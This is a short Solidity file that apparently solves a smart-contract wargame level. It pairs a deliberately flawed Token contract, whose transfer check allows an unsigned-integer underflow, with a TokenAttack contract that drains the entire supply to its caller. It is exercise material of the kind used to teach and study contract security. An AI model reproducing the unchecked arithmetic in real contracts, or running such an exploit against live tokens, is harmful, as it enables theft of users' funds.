// 0xa17413210eaFF9A49d2f4554667B91572e2C917c

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TokenAttack {

    Token private token;

    constructor(address _tokenAddr) public {
        token = Token(_tokenAddr);
    }

    function attack() public {
        token.transfer(msg.sender, token.totalSupply());
    }
}

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}